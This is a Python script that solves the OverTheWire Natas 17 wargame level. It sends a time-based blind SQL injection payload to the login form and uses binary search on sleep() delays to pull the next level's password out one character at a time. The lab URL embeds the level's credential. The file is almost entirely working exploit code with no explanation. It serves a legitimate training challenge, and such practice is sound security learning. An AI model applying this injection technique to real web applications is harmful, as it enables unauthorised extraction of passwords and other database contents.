# coding:utf-8
import requests
url = 'http://natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd@natas17.natas.labs.overthewire.org/index.php'
key = ''

for i in range(1, 33):
    a = 32
    c = 126
    while a < c:
        b = int((a + c) / 2)  # 79 O
        payload = r'natas18" and if(%d<ascii(mid(password,%d,1)),sleep(10),1) and "" like "' % (b, i)
        try:
            req = requests.post(url=url, data={"username": payload}, timeout=2)
        except requests.exceptions.Timeout as e:
            a = b + 1  # 80 P
            b = int((a + c) / 2)  # 103 g
            continue
        c = b
    key += chr(b)
    print(key)

